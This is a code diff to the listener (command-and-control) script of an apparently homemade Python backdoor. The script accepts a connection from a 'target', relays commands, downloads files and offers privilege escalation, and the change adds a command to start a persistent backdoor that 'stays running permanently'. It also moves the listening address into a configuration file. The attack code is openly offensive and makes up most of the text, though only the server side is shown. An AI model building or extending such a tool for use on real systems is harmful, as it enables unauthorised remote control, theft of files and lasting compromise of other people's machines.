@@ -6,7 +6,11 @@
 # Import necessary libraries
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
+import threading  # For proxy server
+import os  # For file operations
 
+# Import configuration
+from configuration import SERVER_IP, SERVER_PORT
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
@@ -60,7 +64,6 @@ def download_file(file_name):
     # Close the local file after downloading is complete.
     f.close()
 
-
 # Function for the main communication loop with the target
 def target_communication():
     
@@ -92,12 +95,12 @@ def target_communication():
     print("   escalate               - Attempt privilege escalation")
     print("   privesc_report         - Generate privilege report")
     print("")
-    print("PROXY COMMANDS:")
-    print("   start_proxy            - Start proxy channel (auto new random port)")
-    print("   stop_proxy             - Stop proxy channel")
-    print("   proxy_status           - Get proxy status")
-    print("   test_proxy             - Test if proxy is responding")
-    print("   test_proxy_full        - Test proxy with real backdoor command")
+    print("MULTI-USER COMMANDS:")
+    print("   This is the main session. Proxy users connect independently.")
+    print("   Each proxy connection creates a separate backdoor instance.")
+    print("")
+    print("PERSISTENCE COMMANDS:")
+    print("   start_persistence      - Start persistent backdoor (stays running permanently)")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -264,19 +267,11 @@ def target_communication():
                 
                 # Also show target response
                 print(f"\nTarget response: {result}")
-        elif command in ['start_proxy', 'stop_proxy', 'proxy_status', 'test_proxy']:
-            # Handle proxy commands
+        elif command in ['start_persistence']:
+            # Handle persistence commands
             result = reliable_recv()
-            if command == 'start_proxy':
-                print(f"proxy: {result}")
-            elif command == 'stop_proxy':
-                print(f"proxy: {result}")
-            elif command == 'proxy_status':
-                print(f"proxy Status:\n{'-'*40}")
-                print(result)
-                print("-"*40)
-            elif command == 'test_proxy':
-                print(f"Proxy Test: {result}")
+            if command == 'start_persistence':
+                print(f"Persistence: {result}")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
@@ -294,8 +289,7 @@ def target_communication():
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
-            print(f"Output:\n{result}")
-
+            print(result)
 
 
 # Create a socket for the server
@@ -304,12 +298,10 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Allow socket reuse to prevent "Address already in use" error
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# Bind the socket to listen on all interfaces and port 5555
-# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
-sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces
+sock.bind((SERVER_IP, SERVER_PORT)) 
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections on port 5555')
+print(f'[+] Listening For The Incoming Connections on port {SERVER_PORT}')
 sock.listen(5)
 
 # Accept incoming connection from the target and obtain the target's IP address.
